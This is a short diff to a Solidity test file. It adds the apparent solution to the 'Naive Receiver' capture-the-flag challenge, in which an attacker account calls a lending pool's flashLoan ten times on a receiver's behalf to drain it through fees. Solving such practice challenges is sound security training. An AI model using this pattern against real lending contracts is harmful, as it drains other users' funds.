@@ -49,7 +49,11 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        for (uint256 i = 0;i<10;i++){
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),1);
+        }
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
